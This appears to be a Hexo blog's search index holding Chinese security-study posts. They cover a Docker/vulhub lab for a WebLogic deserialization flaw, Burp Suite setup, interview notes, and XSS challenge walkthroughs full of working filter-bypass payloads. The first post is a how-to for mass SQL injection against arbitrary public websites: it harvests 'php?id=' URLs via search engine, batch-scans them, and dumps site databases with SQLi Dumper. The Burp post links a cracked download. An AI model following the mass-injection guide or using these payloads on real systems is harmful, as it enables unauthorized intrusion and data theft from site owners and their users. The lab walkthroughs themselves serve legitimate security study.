<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[使用url采集器+超级SQL注入工具+SQLiDumper对公网的SQL注入进行批量检测]]></title>
    <url>%2F2019%2F08%2F14%2Fsql-1%2F</url>
    <content type="text"><![CDATA[url采集器的使用 SQL注入工具的使用 SQLliDumper工具的使用 我已经将打包好的url采集器、python脚本、超级SQL注入工具、SQLiDumper存放在压缩包的同目录下，您的电脑需要提供python环境，Microsoft .NET framework4.5（推荐） 一、使用url采集器搜集公网可能存在注入的url1.在关键词部分输入 inurl:php?id= 2.采集完成之后，右键下方url部分，导出 3.过滤url 由于使用的百度搜索引擎，他的语法不是很好用，我们要使用python脚本进行一遍过滤，我们把导出的ok.txt文件放在磁盘的根磁盘下，python脚本里有读取和写入文件的路径 过滤过的url都变成了?id=这种格式的 二、使用超级SQL注入工具进行SQL注入批量检测 在这一步我们可以使用两种不同的注入工具，超级SQL注入工具或者sqlmap，我用的是超级注入工具 1.注入扫描里有一个导入模块，将刚刚我们导出的txt文件导入 2.进行注入点扫描，在右侧会显示可能存在注入的url，需要进行手工验证 3.我们手工验证了一下，发现确实存在 三、使用SQLi Dumper进行SQL注入1.将刚刚存在注入的url添加到软件中2.开始注入 点击Exploitables-&gt;start Exploiter （此软件针对报错注入很完美，可以无视ips），如果刚刚导入的是存在注入的此页面是存在此网页的一些基本信息的 点击injectables start Analize，就会出现存在注入的url 右键Go to Dumper，我们就可以看到所有此网站的数据以及表了，通过getdump等按钮还可以直接获取表的信息]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[docker-1 搭建漏洞环境并进行漏洞环境测试]]></title>
    <url>%2F2019%2F05%2F29%2Fdocker-1%2F</url>
    <content type="text"><![CDATA[目录 docker简介 docker的安装 docker、centos7、windows10（博主宿主机系统）之间相互通信 -docker容器中下载weblogic12c（可以略过不看） docker容器中下载vulhub漏洞环境 验证Weblogic T3反序列化漏洞（CVE-2017-10271） 用wireshark抓渗透过程的包 docker简介 Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的镜像中，然后发布到任何流行的 Linux或Windows 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。 docker的优点 硬件成本低，虚拟化硬件损耗也较低，性能好； 可以做到运行环境快速部署，启动极快，伸缩有弹性； 支持打包管理，保证一致性； 动态调度迁移成本低。ps:博主用docker主要是为了，下载有漏洞的框架，来进行渗透测试，提高自己的渗透能力。（例如：weblogc 反序列化漏洞、strust2漏洞） docker的安装前期准备 在虚拟机上已经搭建好centos7系统 Docker 要求 CentOS 系统的内核版本高于 3.10 ，查看本页面的前提条件来验证你的CentOS 版本是否支持 Docker 。 配好yum源 docker正式安装 确保 yum 包更新到最新 1yum update 卸载旧版本（如果安装过旧版本的话） 1yum remove docker docker-common docker-selinux docker-engine 安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的 1yum install -y yum-utils device-mapper-persistent-data lvm2 设置yum源 1yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo 可以查看所有仓库中所有docker版本，并选择特定版本安装 1yum list docker-ce --showduplicates | sort -r 下载并安装container-selinux 1234下载wget http://mirrors.atosworldline.com/public/centos/7/extras/x86_64/Packages/container-selinux-2.68-1.el7.noarch.rpm安装rpm -ivh container-selinux-2.68-1.el7.noarch.rpm --nodeps --force 安装docker 123yum install docker-ce #由于repo中默认只开启stable仓库，故这里安装的是最新稳定版17.12.0执行上面的命令是默认安装，下面这条命令就不用执行了yum install &lt;FQPN&gt; # 例如：sudo yum install docker-ce-17.12.0.ce 启动并加入开机启动 12systemctl start dockersystemctl enable docker 验证安装是否成功(有client和service两部分表示docker安装启动都成功了) 1docker version docker、centos7、windows10（博主宿主机系统）之间相互通信 VM中centos7的网络连接方式为nat，并将网卡配置成dhcp模式 docker默认是docker 0网卡，保持默认配置 让windows10和虚拟机通讯NAT模式，centos7可以ping通windows10，windows10却不能ping通centos7 问题在于主机的适配器设置中，NAT相关的适配器变成了自动获取IP地址。 右击电脑右下角网络的符号，点击“打开网络和共享中心” -&gt; “更改适配器设置”，就可以看到虚拟机的几个适配器配置，NAT模式的配置一般是VMnet8。 右键 -&gt; 属性 -&gt; IPv4 -&gt; 属性。 设置ip地址和centos7在同一网段，即可。 让windows10和docker通讯 Windows10连接centos7中的Docker容器的 拓扑图 1宿主机(windows10)---------&gt;虚拟机(192.168.2.131)----------&gt;docker容器 (172.17.0.1) 如果此时在宿主机中ping Docker容器是ping不同的，因为在宿主机上没有通往172.18.0.2网络的路由，宿主机会将发往172.18.0.2网络的数据发往默认路由，这样就无法到达容器。 解决方法：（1）首先要保证centos7和Docker容器，用ping测试是否通畅（2）关闭虚拟中的防火墙： systemctl stop firewalld.service（3）打开windows10的cmd,在其中添加通往 172.17.0.21网络的路由。（4）通往 172.17.0.1网络的数据包由192.168.2.131来转发 具体操作 cmd(管理员模式)下 1route add -p 172.17.0.0 mask 255.255.0.0 192.168.2.131 //-p表示永久添加 查看添加的路由： 12route print172.17.0.0 255.255.0.0 192.168.2.131 192.168.2.200 36 docker容器中下载weblogic12c（可略过不看） 获取镜像 123docker pull ismaleiva90/weblogic12//docker pull #获取镜像//ismaleiva90/weblogic #weblogic的镜像，后面没有指定镜像版本就会获取默认的 latest版本 生成并启动容器 123456789docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest//docker run #启动//-d #使得容器后台运行//-p #指定端口号//ismaleiva90/weblogic：latest #镜像的详细信息//2018/3/6 启动命令： docker run -d -p 7001:7001 -p 7002:7002 --restart=always //ismaleiva90/weblogic12:latest//启动命令更改之后，访问端口变为 7001， http://172.17.0.1:7001/consoledocker run -d -p 7001:7001 -p 7002:7002 --restart=always ismaleiva90/weblogic12:latest 在浏览器中访问weblogichttp://172.17.0.1:49163/console 123172.150.19.40 #当前主机的ip地址49163 #访问端口号访问结果，出现登录页面 登录账号和密码： 12用户名： weblogic密码： welcome1 docker容器中下载vulhub漏洞环境docker-compose 的安装及使用 Docker Compose 是一个用来定义和运行复杂应用的 Docker 工具。使用 Docker Compose 不再需要使用 shell 脚本来启动容器。(通过 docker-compose.yml 配置) 安装 可以通过修改 URL 中的版本，自定义您需要的版本。 12sudo curl -L https://github.com/docker/compose/releases/download/1.22.0/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-composesudo chmod +x /usr/local/bin/docker-compose 卸载 1sudo rm /usr/local/bin/docker-compose 正式下载漏洞环境Vulhub 下载docker漏洞环境：Vulhub Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。 搭建漏洞环境 12git clone https://github.com/vulhub/vulhub.githttps://github.com/vulhub/vulhub/archive/master.zip //直接下载地址 进入vulhub-master/weblogic/CVE-2017-10271目录 运行命令 12docker-compose up -d //安装此漏洞环境docker ps //查看运行服务端口 访问ip:port即可看到web网页 1docker-compose down //测试完毕之后，使用此命令即可结束服务，使环境变为初始状态。 验证Weblogic xml反序列化漏洞（CVE-2017-10271） 用工具查看是否存在weblogic xml反序列化漏洞，检测工具请自行百度下载 利用反序列化漏洞，执行系统命令 用wireshark抓渗透过程的包 抓到执行命令的流量 抓到响应体的包 执行whoami命令的抓包]]></content>
      <categories>
        <category>docker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[brupsuite-sqlmap-1]]></title>
    <url>%2F2019%2F05%2F18%2Fbrupsuite-sqlmap-1%2F</url>
    <content type="text"><![CDATA[说明：brupsuite和sqlmap结合使用的方法 目录brupsuite下载安装brupsuite的配置brupsuite导入证书brupsuite安装sqlmap插件 brupsuite下载安装 网盘链接： https://pan.baidu.com/s/1vVsHMZTkNPAGnSTz3uFoMA提取码: 449h 注册方法参考此链接 https://www.jianshu.com/p/f38f6abc2c11 brupsuite的配置 用火狐浏览器安装FoxyProxy插件如图： 设置本地代理如图： brupsuite导入证书 火狐浏览器输入http://burp/ 下载证书如图： 导入证书如图 brupsuite加载sqlmap插件 方法参考此链接 https://blog.csdn.net/cjx529377/article/details/81490750 之后会演示brup各个插件的功能和使用]]></content>
      <categories>
        <category>brupsuite</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[security-5 xss小游戏]]></title>
    <url>%2F2019%2F05%2F03%2Fsecurity-5%2F</url>
    <content type="text"><![CDATA[说明 xss小游戏答案与解析 针对level 1-18 有的html实体编码我用单引号如java’&amp;’’#’115;cript:alert() level-1 这道题很简单直接在url上输入payload 1&amp;#60;script&gt;alert(1)&amp;#60;/script&gt; 源代码分析 12$str = $_GET[&quot;name&quot;];echo &quot;&amp;#60;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&amp;#60;/h2&gt;&quot;; 发现源代码，对url输入的参数没有任何过滤 level-2 输入level-1的payload，可以看出对url的参数转译成HTML实体 查看源码 123456$str = $_GET[&quot;keyword&quot;];echo &quot;&amp;#60;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&amp;#60;center&gt;&amp;#60;form action=level2.php method=GET&gt;&amp;#60;input name=keyword value=&quot;&apos;.$str.&apos;&quot;&gt; //没有实体化&amp;#60;input type=submit name=submit value=&quot;搜索&quot;/&gt; &amp;#60;/form&gt; htmlspecialchars()函数把预定义的字符转换为 HTML 实体 但是发现在form表单输出并没有实体化，可以在表单输入如下payload 11&quot;&gt;&amp;#60script&gt;alert(1)&amp;#60/script&gt;// 也可以在url输入如下payload 1&quot;onclick=&quot;window.alert() 点击表单，就会弹出弹窗 level-3 直接看源码 123456$str = $_GET[&quot;keyword&quot;];echo &quot;&amp;#60h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&amp;#60form action=level3.php method=GET&gt;&amp;#60input name=keyword value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;&amp;#60input type=submit name=submit value=搜索 /&gt;&amp;#60/form&gt; 发现表单输出也实体化了，payload如下： 1&apos;onclick=&apos;window.alert() htmlspecialchars转译双引号，但不转义单引号，这里程序还有个小bug，url输入没反应，理论上应该也可以成功 level-4 还是直接看源码 123456789ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&amp;#60h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&amp;#60form action=level4.php method=GET&gt;&amp;#60input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&amp;#60input type=submit name=submit value=搜索 /&gt;&amp;#60/form&gt; str_replace()把字符串 “Hello world!” 中的字符 “world” 替换为 “Shanghai”： 123&amp;#60?phpecho str_replace(&quot;world&quot;,&quot;Shanghai&quot;,&quot;Hello world!&quot;);?&gt; 可以看出url，form输入的参数，”&lt;”,”&gt;”,分别被替换为”,” payload： 1&quot;onclick=&quot;window.alert() level-5 源码 12345678$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&amp;#60script&quot;,&quot;&amp;#60scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&amp;#60h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&amp;#60form action=level5.php method=GET&gt;&amp;#60input name=keyword value=&quot;&apos;.$str3.&apos;&quot;&gt;&amp;#60input type=submit name=submit value=搜索 /&gt;&amp;#60/form&gt; 可以看到&amp;#60script&gt;被替换成&amp;#60scr_ipt&gt;,on被替换成o_n，onclick点击事件不能用了 大写可以吗？当然不可以因为 strtolower把所有字符转换为小写 但是可以用如下payload 1&quot;&gt;&amp;#60a href=&quot;javascript:alert(&apos;a&apos;)&quot;&gt;1&amp;#60/a&gt;// 记得要闭合前面的括号，也注释掉后面的js语句 level-6 查看源码 123456789101112ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);echo &quot;&amp;#60h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&amp;#60form action=level6.php method=GET&gt;&amp;#60input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&amp;#60input type=submit name=submit value=搜索 /&gt;&amp;#60/form&gt; 可以看出，on-&gt;o_n,src-&gt;sr_c,data-&gt;da_ta,href-&gt;hr_ef 但是这时候没有strtolower函数，可以用如下payload 11 &quot;&gt;&amp;#60a HREF=&quot;javascript:alert(&apos;a&apos;)&quot;&gt;1&amp;#60/a&gt;// level-7 查看源代码 123456789101112ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&amp;#60h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&amp;#60/h2&gt;&quot;.&apos;&amp;#60form action=level7.php method=GET&gt;&amp;#60input name=keyword value=&quot;&apos;.$str6.&apos;&quot;&gt;&amp;#60input type=submit name=submit value=搜索 /&gt;&amp;#60/form&gt; 大写转为小写，script等字符转化为空，但是双写就可以绕过 payload 1&quot;&gt;&amp;#60scrscriptipt&gt;alert(1)&amp;#60/scrscriptipt&gt;// level-8 源码 12345678910111213141516ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);echo &apos;&amp;#60form action=level8.php method=GET&gt;&amp;#60input name=keyword value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;&amp;#60input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&amp;#60?php echo &apos;&amp;#60BR&gt;&amp;#60a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&apos;;?&gt; 这道题有点难，这时候可以转化编码 payload如下： 123s转化位unicode编码：java‘&amp;’‘#’115;cript:alert()c,r,i,p,t都可转化成base64编码 level-9 源码 12345678if(false===strpos($str7,&apos;http://&apos;))&#123; echo &apos;&amp;#60BR&gt;&amp;#60a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&amp;#60/a&gt;&apos;; &#125;else&#123; echo &apos;&amp;#60BR&gt;&amp;#60a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&apos;;&#125; 可以发现，和level-8的区别是友情链接多了一个判断 strpos 查找 “php” 在字符串中第一次出现的位置：返回值：返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。注释：字符串位置从 0 开始，不是从 1 开始。123&amp;#60?phpecho strpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;);?&gt; 就是说你在表单填的信息，必须是http的链接，不是的话就认为是有恶意代码，报错 我们可以加http注释，不发挥作用 payload 1javascri&apos;&amp;&apos;#&apos;x0070;t:alert(1)/*http://www.baidu.com*/ level-10 源码 1234567891011ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&amp;#60h2&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&amp;#60form id=search&gt;&amp;#60input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&amp;#60input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&amp;#60input name=&quot;t_sort&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;&amp;#60/form&gt; keyword参数没什么作用，看到3个input标签，属性都是hidden，很懵。但是目标很明确，让任意一个hidden，变成text，就可以成功。但是参数只有从t_sort中获取，因此 payload 1&amp;t_sort=&quot;onclick=&quot;alert()&quot;type=&quot;text&quot; &amp;逻辑语句， 1链接两个语句，与and同义 level-11 源码 1234567891011$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&apos;HTTP_REFERER&apos;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&amp;#60h2&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&amp;#60form id=search&gt;&amp;#60input name=&quot;t_link&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&amp;#60input name=&quot;t_history&quot; value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;&amp;#60input name=&quot;t_sort&quot; value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;&amp;#60input name=&quot;t_ref&quot; value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt; 分析源码可以看到$str11=$_SERVER[‘HTTP_REFERER’];，他接收了上一题的referer。 用level-10完成之前，抓包，然后将referer改成如下payload即可完成 payload 1Referer:t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1) level-12 其他的和上一题基本相似，接收了上一题的user-agent，源码 1$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;]; 在level-11完成之前用brup抓包，将user-agent参数改成如下payload payload 1User-Agent:t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1) level-13 接收了上一题的cookie源码 1$str11=$_COOKIE[&quot;user&quot;]; //获取cookie的user值 在level-12完成之前用brup抓包，将cookie参数改成如下payload payload 1Cookie:user=t_sort=&quot;type=&quot;text&quot; onclick=&quot;alert(1); level-14 利用exiftool改变图片的exif信息 上传一个含有xss代码的图片触发xss 因为要用到乌云信息，参考先知社区链接：https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12 level-15 看源码 123ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;src&quot;];echo &apos;&amp;#60body&gt;&amp;#60span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&amp;#60/span&gt; AngularJS ng-include 指令 ng-include 指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。ng-include 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下 因此调用level-1的代码payload 1/level15.php?src=&apos;level1.php?name=test&amp;#60img src=1 onerror=alert(1)&gt;&apos; level-16 看源码 123456789$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str); $str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2); $str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);echo .$str5.;&amp;#60img src=level16.png&gt;&amp;#60?phpecho &quot;&amp;#60h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&amp;#60/h3&gt;&quot;; 分析源码可知，script，/，空格都转译了 用img标签，%0d或者%0a作为分隔符代替空格，paylaod如下 1?keyword=test&amp;#60img%0dsrc=1%0donerror=alert(1)&gt; level-17 源码 1echo &quot;&amp;#60embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;; &amp;#60embed&gt; 标签定义嵌入的内容，比如插件。 火狐浏览器不显示，我用谷歌可以成功 payload 1?arg01=a&amp;arg02= onmouseover=alert(1) 理论上onclick也可以成功，但是直接，就跳转到错误界面了，没来得及显 onmouseup 事件触发后，再触发 onclick 事件 level-18 源码 1234&quot;&amp;#60?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&quot;&amp;#60embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt; 分析源码和level-17没什么差异 payload 1?arg01=a&amp;arg02=b%20onmouseout=alert(1)]]></content>
      <categories>
        <category>网络安全笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[security-2 应聘一些题目整理-1]]></title>
    <url>%2F2019%2F05%2F01%2Fsecurity-2%2F</url>
    <content type="text"><![CDATA[security-2 面试题目整理-2categories: 网络安全笔记关于5月份公司招聘的一些面试题目供自己预习学习 SDL缓冲区溢出的防护措施加密算法RSA加密算法：理论上不能被破解DES: 目前还没有攻破3DESAES: 替代原先的DES加密BNS: 防止Session Cookie被跨站脚本执行漏洞参考网站：https://www.cnblogs.com/forwill/p/6181984.html secure secure属性：一个cookie被设置了secure=true，那么这个cookie只能用https协议发送给服务器，http协议不发送。cookie在https的情况下创建的，而且他的Secure=true，之后你一直用https访问其他的页面（比如登录之后点击其他子页面，单点登陆），cookie会被发送到服务器，你无需重新登录就可以跳转到其他页面。如果这是你把url改成http协议访问其他页面，你就需要重新登录了，因为这个cookie不能在http协议中发送。 httponly 在cookie中设置了HttpOnly属性，通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击。 将session加密多个session标记Android逆向分析工具Drozer参考链接：https://wenku.baidu.com/view/f70797ab6137ee06eff91870.html 反编译回编译参考链接：https://blog.csdn.net/qq_37422933/article/details/81356737# APKToolAPKTool是GOOGLE提供的APK编译工具，能够反编译及回编译apk，同时安装反编译系统apk所需要的framework-res框架，清理上次反编译文件夹等功能。需要java支持 Android KillerAndroid Killer 是一款可视化的安卓应用逆向工具，集Apk反编译、Apk打包、Apk签名，编码互转，ADB通信（应用安装-卸载-运行-设备文件管理）等特色功能于一 身，支持logcat日志输出，语法高亮，基于关键字（支持单行代码或多行代码段）项目内搜索，可自定义外部工具；吸收融汇多种工具功能与特点，打造一站 式逆向工具操作体验，大大简化了用户在安卓应用/游戏修改过程中的各类繁琐工作。参考链接：http://doc.okbase.net/guiguzi1110/archive/119043.html JEBPKI管理对象 证书、密钥、证书撤销 往年攻击xcodeghostwormhole参考链接：https://bbs.kafan.cn/thread-1862013-1-1.html 心脏滴血shellshock参考链接：https://blog.csdn.net/Anprou/article/details/72819989 Hook常用的逆向分析工具IDA Pro交互式反汇编器专业版（Interactive Disassembler Professional），人们常称其为IDA Pro，或简称为IDA。是目前最棒的一个静态反编译软件，为众多0day世界的成员和ShellCode安全分析人士不可缺少的利器！IDA Pro是一款交互式的，可编程的，可扩展的，多处理器的，交叉Windows或Linux WinCE MacOS平台主机来分析程序， 被公认为最好的花钱可以买到的逆向工程利器。IDA Pro已经成为事实上的分析敌意代码的标准并让其自身迅速成为攻击研究领域的重要工具。它支持数十种CPU指令集其中包括Intel x86，x64，MIPS，PowerPC，ARM，Z80，68000，c8051等等。 WinDBG调试应用程序的工具 OLLYDBG参考链接：https://baike.baidu.com/item/OLLYDBG/4039151?fr=aladdin 下面哪个是加壳工具加壳：其实是利用特殊的算法，对可执行文件里的资源进行压缩，只不过这个压缩之后的文件，可以独立运行，解压过程完全隐蔽，都在内存中完成。它们附加在原程序上通过加载器载入内存后，先于原始程序执行，得到控制权，执行过程中对原始程序进行解密、还原，还原完成后再把控制权交还给原始程序，执行原来的代码部分。加上外壳后，原始程序代码在磁盘文件中一般是以加密后的形式存在的，只在执行时在内存中还原，这样就可以比较有效地防止破解者对程序文件的非法修改，同时也可以防止程序被静态反编译。 upxASPack脱壳工具VMProtectAndroid应用程序的结构包括哪些android NDKIIS状态码关于PKI/CA证书证书上具有证书授权中心的数字签名拥有者的基本信息，公开密钥， 根本上反域CSRF漏洞验证referer，cookie，增加tooken Android常见风险组件安全数据存储安全数据传输安全漏洞SDL安全开发流程参考链接：https://blog.csdn.net/xinyi0622/article/details/73882559/ 培训安全质量门/bug栏安全和风险评估安全和隐私风险评估反序列化参考链接：https://www.jianshu.com/p/6219d8024d2c 魔术引号魔术引号（Magic Quote）是一个自动将进入PHP脚本的数据进行转义的过程。最好在编码时不要转义而在运行时根据需要而转义 0day1day安全补丁用来修复安全漏洞保护最终用户不受安全威胁。但是公开补丁其实也会带来安全风险。这就是1day 堆叠注入参考链接：https://www.cnblogs.com/0nth3way/articles/7128189.html 填充提示漏洞If-Modified-Since和If-None-Match参考链接：https://blog.csdn.net/lhl1124281072/article/details/80067764参考链接：https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/If-None-Match NSA武器库explorer.exe参考链接：https://baike.baidu.com/item/explorer.exe/1825316 反病毒沙盒沙盒原理是一种类似于影子系统的，比带有宿主的虚拟机更深层的系统内核级技术。它可以接管病毒调用接口或函数的行为。并会在确认病毒行为后实行回滚机制，让系统复原。沙盒原理也叫沙箱，英文sandbox。在计算机领域指一种虚拟技术，且多用于计算机安全技术。安全软件可以先让它在沙盒中运行，如果含有恶意行为，则禁止程序的进一步运行，而这不会对系统造成任何危害。 _Hydra(爆破神器)参考链接：https://www.cnblogs.com/zoushou/p/4126400.html 域渗透参考链接：https://blog.csdn.net/Fly_hps/article/details/80636855 kerberosKerberos是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。这个词又指麻省理工学院为这个协议开发的一套计算机软件。 golden ticketpowershell参考链接：https://baijiahao.baidu.com/s?id=1594522197885174841&amp;wfr=spider&amp;for=pc badusb参考链接：http://www.baike.com/wiki/BadUSB 重放攻击重放攻击(Replay Attacks)又称重播攻击、回放攻击，是指攻击者发送一个目的主机已接收过的包，来达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。重放攻击可以由发起者，也可以由拦截并重发该数据的敌方进行。攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。重放攻击在任何网络通过程中都可能发生，是计算机世界黑客常用的攻击方式之一。 HMACHMAC是密钥相关的哈希运算消息认证码，HMAC运算利用哈希算法，以一个密钥和一个消息为输入，生成一个消息摘要作为输出。 哪些是CSRF漏洞的防御方案?A 检测HTTPreferer 字段同域B 限制sessioncookie的生命周期C 使用验证码D cookie关键字段设置HttpOnly属性 以下避免sql注入方法mysqli_real_escape_stringmysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。 addslashes()在每个双引号（”）前添加反斜杠： 未完待续]]></content>
      <categories>
        <category>网络安全笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[security-1 Xss练习笔记]]></title>
    <url>%2F2019%2F04%2F28%2Fsecurity-1%2F</url>
    <content type="text"><![CDATA[说明 Web For Pentester 平台 针对Xss-Example 1-10 写这篇文章我用\转义html标签，因为这篇文章用markdown写的 参考网站： https://blog.csdn.net/shinpachi8/article/details/54425439 https://blog.csdn.net/qq_20307987/article/details/51284169 https://blog.csdn.net/weixin_40871137/article/details/81706515 Web For PentesterXSS-Example 11&lt;\script&gt; alert(1) &lt;\/script&gt; XSS-Example 2 进行了一些过滤，script标签被过滤掉了 1&lt;\sc&lt;\script&gt;ript&gt; alert(1) &lt;\/sc&lt;\/script&gt;ript&gt; XSS-Example 31&lt;-sc&lt;-script&gt;ript&gt; alert(1) &lt;-/sc&lt;-/script&gt;ript&gt; XSS-Example 4 在本例中，script被完全列入黑名单，如果请求中包含script脚本，则停止执行 这时候需要用img标签 1&lt;\img src=liu.jpg onerror=alert(&quot;xss&quot;)&gt; XSS-Example 5 在本例中，alert被过滤了，只要带alert，页面会返回error 使用JavaScript的eval和String.fromCharCode()，在不直接使用alert这个单词的情况下得到一个警告框fromcharcode()将把一个整数(十进制值)解码为对应的字符 可使用的方法如下 123&lt;\img src=liu.jpg onerror=prompt(&apos;1&apos;)&gt;&lt;\img src=liu.jpg onerror=confirm(&apos;1&apos;)&gt;&lt;\script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;\/script&gt; fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串,题目中String.fromCharCode(97,108,101,114,116,40,49,41)相当于alert(1) eval()是程序语言中的函数，功能是获取返回值，不同语言大同小异，函数原型是返回值 = eval( codeString )，如果eval函数在执行时遇到错误，则抛出异常给调用者 XSS-Example 6 查看源代码发现将输入到url的脚本输出到 1var $a= &quot;hacker&lt;\script&gt;alert(1)&lt;\/script&gt;&quot;; 利用javascipt语法闭合前面的”;中间加上语句alert(1);结束注释后面的分号// 1&quot;;alert(1);// XSS-Example 7 和Example相似 不同之处在与闭合是单引号 1&apos;;alert(1);// 